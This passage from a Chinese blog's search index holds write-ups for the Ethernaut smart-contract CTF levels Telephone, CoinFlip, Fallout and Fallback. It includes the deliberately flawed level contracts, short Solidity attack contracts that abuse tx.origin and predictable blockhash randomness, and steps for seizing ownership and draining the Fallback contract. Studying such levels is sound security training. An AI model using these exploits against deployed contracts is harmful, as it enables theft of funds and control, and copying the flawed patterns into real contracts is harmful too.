_owner。如果tx.origin值不同，msg.sender它将owner使用函数输入参数更新_owner。 2.2 tx.origin() 和 msg.sender()的区别 tx.origin(address)： 交易的发送方（完整的调用链）返回的是已发送（原始）交易的地址 msg.sender( address)：消息的发送者（当前通话）返回的是发起呼叫的值external（合约调用者） 画图区分： 2.3 攻击合约： contract Hack &#123; function exploit(Telephone level) public &#123; level.changeOwner(msg.sender); &#125; &#125; 2.4 调用Hack 合约中的 exploit（）函数，形参是关卡的实例地址就🆗的 3. 解题 3.1 获取关卡的实例：0xf956A62d9BD792a712763aA21863d3025A5dd926 3.2 调用关卡合约并部署攻击合约 3.3 查看原拥有着，并调用攻击合约中额exploit() 函数 3.4 提交实例并查看结果 3.5 成功！！！！","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"CoinFlip","slug":"CTFS/ethernaut/CoinFlip","date":"2023-01-08T02:12:10.000Z","updated":"2023-01-08T02:12:10.000Z","comments":true,"path":"2023/01/08/CTFS/ethernaut/CoinFlip/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/CTFS/ethernaut/CoinFlip/","excerpt":"","text":"CoinFilp1. 题目要求这是一个掷硬币的游戏，你需要连续的猜对结果。 完成这一关，你需要通过你的超能力来连续猜对十次。 2. 分析2.1 tips： 参考视频 2.2 _guess = uint256(blockhash(block.number.sub(1))).div(FACTOR) == 1 ? true : false2）我们知道不能flip()在同一个块中调用多次；否则该功能将恢复。这意味着要通过挑战，我们至少需要猜对 11 个区块 2.3 攻击合约： 123456789101112131415161718192021contract Hack &#123; CoinFlip private immutable target; uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968; constructor (address _target) &#123; target = CoinFlip(_target); &#125; function flip() external &#123; bool guess = _guess(); require(target.flip(guess),&quot;guess failed&quot;); &#125; function _guess() private view returns(bool) &#123; uint256 blockValue = uint256(blockhash(block.number - 1)); uint256 coinFlip = blockValue / FACTOR; bool side = coinFlip == 1 ? true : false; return side; &#125;&#125; 2.3 调用 10次 攻击合约的 flip() 函数 来改变 CoinFilp 合约中 consecutiveWins 的值 3. 解题 3.1 获取关卡的实例：0x2F3D37ae048f36c8B2674aB1a4B8D3Bab4B6B716 3.2 在remix中调用关卡合约 3.3 部署攻击合约 3.5 调用 11次 合约中filp() 函数 3.6 提交实例并查看结果 成功！！！","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Fallout","slug":"CTFS/ethernaut/Fallout","date":"2023-01-08T01:47:10.000Z","updated":"2023-01-08T01:47:10.000Z","comments":true,"path":"2023/01/08/CTFS/ethernaut/Fallout/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/08/CTFS/ethernaut/Fallout/","excerpt":"","text":"Fallout1.题目要求获得以下合约的所有权来完成这一关 12345678910111213141516171819202122232425262728293031323334353637383940414243// SPDX-License-Identifier: MITpragma solidity ^0.6.0;import &#x27;openzeppelin-contracts-06/math/SafeMath.sol&#x27;;contract Fallout &#123; using SafeMath for uint256; mapping (address =&gt; uint) allocations; address payable public owner; /* constructor */ function Fal1out() public payable &#123; owner = msg.sender; allocations[owner] = msg.value; &#125; modifier onlyOwner &#123; require( msg.sender == owner, &quot;caller is not the owner&quot; ); _; &#125; function allocate() public payable &#123; allocations[msg.sender] = allocations[msg.sender].add(msg.value); &#125; function sendAllocation(address payable allocator) public &#123; require(allocations[allocator] &gt; 0); allocator.transfer(allocations[allocator]); &#125; function collectAllocations() public onlyOwner &#123; msg.sender.transfer(address(this).balance); &#125; function allocatorBalance(address allocator) public view returns (uint) &#123; return allocations[allocator]; &#125;&#125; 2. 分析 import &#39;openzeppelin-contracts-06/math/SafeMath.sol&#39;; 2.1 由于没有SafeMath.sol文件在remix中，所以可以在remix中建相同路径的文件夹 2.2 阅读代码可知，在fal1out() 函数中可以修改合约的所有权，即成功调用fal1out()函数即可 3. 解题 3.1 获取关卡实例地址： 0x578d3Fca5950E9CB155B91002FAe154796D05217 3.2 调用关卡合约 3.3 3.4 查看原合约拥有者 3.5 调用Fal1out() 函数之后，再次查看合约的owner 3.6 提交实例并查看结果 成功！！！！","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]},{"title":"Fallback","slug":"CTFS/ethernaut/Fallback","date":"2023-01-07T08:47:10.000Z","updated":"2023-01-07T08:47:10.000Z","comments":true,"path":"2023/01/07/CTFS/ethernaut/Fallback/","link":"","permalink":"https://biyouqiuqiu.com/2023/01/07/CTFS/ethernaut/Fallback/","excerpt":"","text":"Fallback题解1. 题目要求① 获得这个合约的所有权 ② 把它的合约余额减到0 提示： 如何通过与ABI互动发送ether 如何在ABI之外发送ether 转换 wei&#x2F;ether 单位 (参见 help() 命令) Fallback 方法 合约代码：123456789101112131415161718192021222324252627282930313233343536373839404142// SPDX-License-Identifier: MITpragma solidity ^0.8.0;contract Fallback &#123; mapping(address =&gt; uint) public contributions; address public owner; constructor() &#123; owner = msg.sender; contributions[msg.sender] = 1000 * (1 ether); &#125; modifier onlyOwner &#123; require( msg.sender == owner, &quot;caller is not the owner&quot; ); _; &#125; function contribute() public payable &#123; require(msg.value &lt; 0.001 ether); contributions[msg.sender] += msg.value; if(contributions[msg.sender] &gt; contributions[owner]) &#123; owner = msg.sender; &#125; &#125; function getContribution() public view returns (uint) &#123; return contributions[msg.sender]; &#125; function withdraw() public onlyOwner &#123; payable(owner).transfer(address(this).balance); &#125; receive() external payable &#123; require(msg.value &gt; 0 &amp;&amp; contributions[msg.sender] &gt; 0); owner = msg.sender; &#125;&#125; 2. 分析 2.1 该题的题眼在于，通过owner &#x3D; msg.sender语句把合约的所有权设置为合约调用者，观察分析合约可知，在contribute()方法和 receive() 方法中拥有该语句，但如果执行contribute() 的话需要调用 0.001 * 1000000 + 1次 显然这样的作法是不可取的，故 只能采用receive()方法来实现 2.2 receive()成功调用的条件是，调用者的贡献值大于0.001ether 还用支付 &gt; 0的费用，我们只能通过调用contribute()函数改变合约调用者的贡献值，改好之后就可以调用到合约的receive()函数，就可以成为合约的拥有者 2.3 最后调用withdraw() 函数将合约的钱全部转给owner 即： 3.解题 3.1 先从题目中获取关卡的地址： 3.2 到remix中，将网络和账户切换为自己的钱包账户， 3.3 给自己的钱包账户加入贡献值 contributions 3.4 调用receive() 函数，实现获取 合约所有权操作 3.5 查看当前合约的owner 3.6 最后调用withdraw() 函数，将合约的余额全部转出 3.7 回到题目提交实例 3.8 返回结果，通过！！！：","categories":[{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"}]}],"categories":[{"name":"Basic_Knowledge","slug":"Basic-Knowledge","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/"},{"name":"Solidity","slug":"Basic-Knowledge/Solidity","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/Solidity/"},{"name":"DEFI","slug":"DEFI","permalink":"https://biyouqiuqiu.com/categories/DEFI/"},{"name":"ERC","slug":"DEFI/ERC","permalink":"https://biyouqiuqiu.com/categories/DEFI/ERC/"},{"name":"proxy","slug":"DEFI/proxy","permalink":"https://biyouqiuqiu.com/categories/DEFI/proxy/"},{"name":"Utils","slug":"Utils","permalink":"https://biyouqiuqiu.com/categories/Utils/"},{"name":"Solidity","slug":"Utils/Solidity","permalink":"https://biyouqiuqiu.com/categories/Utils/Solidity/"},{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/categories/CTFS/"},{"name":"Paradigm-CTF-2022","slug":"CTFS/Paradigm-CTF-2022","permalink":"https://biyouqiuqiu.com/categories/CTFS/Paradigm-CTF-2022/"},{"name":"Paradigm-CTF-2021","slug":"CTFS/Paradigm-CTF-2021","permalink":"https://biyouqiuqiu.com/categories/CTFS/Paradigm-CTF-2021/"},{"name":"Experience","slug":"Experience","permalink":"https://biyouqiuqiu.com/categories/Experience/"},{"name":"tips","slug":"Experience/tips","permalink":"https://biyouqiuqiu.com/categories/Experience/tips/"},{"name":"CBSC-2022","slug":"CTFS/CBSC-2022","permalink":"https://biyouqiuqiu.com/categories/CTFS/CBSC-2022/"},{"name":"MetaTrust CTF","slug":"CTFS/MetaTrust-CTF","permalink":"https://biyouqiuqiu.com/categories/CTFS/MetaTrust-CTF/"},{"name":"Mr Steal Yo Crypto","slug":"CTFS/Mr-Steal-Yo-Crypto","permalink":"https://biyouqiuqiu.com/categories/CTFS/Mr-Steal-Yo-Crypto/"},{"name":"foundry","slug":"Utils/foundry","permalink":"https://biyouqiuqiu.com/categories/Utils/foundry/"},{"name":"CTFProtocol","slug":"CTFS/CTFProtocol","permalink":"https://biyouqiuqiu.com/categories/CTFS/CTFProtocol/"},{"name":"ChainFlag","slug":"CTFS/ChainFlag","permalink":"https://biyouqiuqiu.com/categories/CTFS/ChainFlag/"},{"name":"EVM Puzzles","slug":"CTFS/EVM-Puzzles","permalink":"https://biyouqiuqiu.com/categories/CTFS/EVM-Puzzles/"},{"name":"ethernaut","slug":"CTFS/ethernaut","permalink":"https://biyouqiuqiu.com/categories/CTFS/ethernaut/"},{"name":"damn defi","slug":"CTFS/damn-defi","permalink":"https://biyouqiuqiu.com/categories/CTFS/damn-defi/"},{"name":"proxy","slug":"Basic-Knowledge/proxy","permalink":"https://biyouqiuqiu.com/categories/Basic-Knowledge/proxy/"},{"name":"gnosis","slug":"DEFI/gnosis","permalink":"https://biyouqiuqiu.com/categories/DEFI/gnosis/"},{"name":"Proxy","slug":"DEFI/Proxy","permalink":"https://biyouqiuqiu.com/categories/DEFI/Proxy/"},{"name":"uniswap","slug":"DEFI/uniswap","permalink":"https://biyouqiuqiu.com/categories/DEFI/uniswap/"},{"name":"hardhat","slug":"Utils/hardhat","permalink":"https://biyouqiuqiu.com/categories/Utils/hardhat/"},{"name":"Ethersjs","slug":"Utils/Ethersjs","permalink":"https://biyouqiuqiu.com/categories/Utils/Ethersjs/"},{"name":"Ethers.js","slug":"Utils/Ethers-js","permalink":"https://biyouqiuqiu.com/categories/Utils/Ethers-js/"},{"name":"capther the ether","slug":"CTFS/capther-the-ether","permalink":"https://biyouqiuqiu.com/categories/CTFS/capther-the-ether/"},{"name":"Web3","slug":"Utils/Web3","permalink":"https://biyouqiuqiu.com/categories/Utils/Web3/"}],"tags":[{"name":"知识扫盲","slug":"知识扫盲","permalink":"https://biyouqiuqiu.com/tags/%E7%9F%A5%E8%AF%86%E6%89%AB%E7%9B%B2/"},{"name":"ERC","slug":"ERC","permalink":"https://biyouqiuqiu.com/tags/ERC/"},{"name":"ERC1967","slug":"ERC1967","permalink":"https://biyouqiuqiu.com/tags/ERC1967/"},{"name":"ERC1167","slug":"ERC1167","permalink":"https://biyouqiuqiu.com/tags/ERC1167/"},{"name":"Upgradeable","slug":"Upgradeable","permalink":"https://biyouqiuqiu.com/tags/Upgradeable/"},{"name":"signature","slug":"signature","permalink":"https://biyouqiuqiu.com/tags/signature/"},{"name":"ERC4626","slug":"ERC4626","permalink":"https://biyouqiuqiu.com/tags/ERC4626/"},{"name":"ERC1155","slug":"ERC1155","permalink":"https://biyouqiuqiu.com/tags/ERC1155/"},{"name":"ERC777","slug":"ERC777","permalink":"https://biyouqiuqiu.com/tags/ERC777/"},{"name":"ERC1820","slug":"ERC1820","permalink":"https://biyouqiuqiu.com/tags/ERC1820/"},{"name":"ERC721","slug":"ERC721","permalink":"https://biyouqiuqiu.com/tags/ERC721/"},{"name":"ERC173","slug":"ERC173","permalink":"https://biyouqiuqiu.com/tags/ERC173/"},{"name":"ERC191","slug":"ERC191","permalink":"https://biyouqiuqiu.com/tags/ERC191/"},{"name":"ERC601","slug":"ERC601","permalink":"https://biyouqiuqiu.com/tags/ERC601/"},{"name":"ERC165","slug":"ERC165","permalink":"https://biyouqiuqiu.com/tags/ERC165/"},{"name":"ERC20","slug":"ERC20","permalink":"https://biyouqiuqiu.com/tags/ERC20/"},{"name":"Experience","slug":"Experience","permalink":"https://biyouqiuqiu.com/tags/Experience/"},{"name":"CTF","slug":"CTF","permalink":"https://biyouqiuqiu.com/tags/CTF/"},{"name":"soliditiy","slug":"soliditiy","permalink":"https://biyouqiuqiu.com/tags/soliditiy/"},{"name":"tips","slug":"tips","permalink":"https://biyouqiuqiu.com/tags/tips/"},{"name":"using","slug":"using","permalink":"https://biyouqiuqiu.com/tags/using/"},{"name":"CTFS","slug":"CTFS","permalink":"https://biyouqiuqiu.com/tags/CTFS/"},{"name":"foundry","slug":"foundry","permalink":"https://biyouqiuqiu.com/tags/foundry/"},{"name":"solidity","slug":"solidity","permalink":"https://biyouqiuqiu.com/tags/solidity/"},{"name":"create2","slug":"create2","permalink":"https://biyouqiuqiu.com/tags/create2/"},{"name":"EVM_Puzzles","slug":"EVM-Puzzles","permalink":"https://biyouqiuqiu.com/tags/EVM-Puzzles/"},{"name":"Solidity","slug":"Solidity","permalink":"https://biyouqiuqiu.com/tags/Solidity/"},{"name":"基础漏洞","slug":"基础漏洞","permalink":"https://biyouqiuqiu.com/tags/%E5%9F%BA%E7%A1%80%E6%BC%8F%E6%B4%9E/"},{"name":"damn defi","slug":"damn-defi","permalink":"https://biyouqiuqiu.com/tags/damn-defi/"},{"name":"Proxy","slug":"Proxy","permalink":"https://biyouqiuqiu.com/tags/Proxy/"},{"name":"gnosis","slug":"gnosis","permalink":"https://biyouqiuqiu.com/tags/gnosis/"},{"name":"proxiy","slug":"proxiy","permalink":"https://biyouqiuqiu.com/tags/proxiy/"},{"name":"内联汇编","slug":"内联汇编","permalink":"https://biyouqiuqiu.com/tags/%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96/"},{"name":"Timelock","slug":"Timelock","permalink":"https://biyouqiuqiu.com/tags/Timelock/"},{"name":"Transparent","slug":"Transparent","permalink":"https://biyouqiuqiu.com/tags/Transparent/"},{"name":"uniswap v2","slug":"uniswap-v2","permalink":"https://biyouqiuqiu.com/tags/uniswap-v2/"},{"name":"PrivateKey","slug":"PrivateKey","permalink":"https://biyouqiuqiu.com/tags/PrivateKey/"},{"name":"ASCII","slug":"ASCII","permalink":"https://biyouqiuqiu.com/tags/ASCII/"},{"name":"hardhat","slug":"hardhat","permalink":"https://biyouqiuqiu.com/tags/hardhat/"},{"name":"encode","slug":"encode","permalink":"https://biyouqiuqiu.com/tags/encode/"},{"name":"encodePacked","slug":"encodePacked","permalink":"https://biyouqiuqiu.com/tags/encodePacked/"},{"name":"privake key","slug":"privake-key","permalink":"https://biyouqiuqiu.com/tags/privake-key/"},{"name":"ethereumjs","slug":"ethereumjs","permalink":"https://biyouqiuqiu.com/tags/ethereumjs/"},{"name":"abi.encode","slug":"abi-encode","permalink":"https://biyouqiuqiu.com/tags/abi-encode/"},{"name":"abi.encodePacked","slug":"abi-encodePacked","permalink":"https://biyouqiuqiu.com/tags/abi-encodePacked/"},{"name":"solidityKeccak256","slug":"solidityKeccak256","permalink":"https://biyouqiuqiu.com/tags/solidityKeccak256/"},{"name":"abiCoder.encode","slug":"abiCoder-encode","permalink":"https://biyouqiuqiu.com/tags/abiCoder-encode/"},{"name":"hash","slug":"hash","permalink":"https://biyouqiuqiu.com/tags/hash/"},{"name":"ethers.js","slug":"ethers-js","permalink":"https://biyouqiuqiu.com/tags/ethers-js/"},{"name":"Web3","slug":"Web3","permalink":"https://biyouqiuqiu.com/tags/Web3/"},{"name":"学习总结","slug":"学习总结","permalink":"https://biyouqiuqiu.com/tags/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/"},{"name":"Remix-debug","slug":"Remix-debug","permalink":"https://biyouqiuqiu.com/tags/Remix-debug/"},{"name":"验证签名","slug":"验证签名","permalink":"https://biyouqiuqiu.com/tags/%E9%AA%8C%E8%AF%81%E7%AD%BE%E5%90%8D/"},{"name":"ecrecover","slug":"ecrecover","permalink":"https://biyouqiuqiu.com/tags/ecrecover/"}]}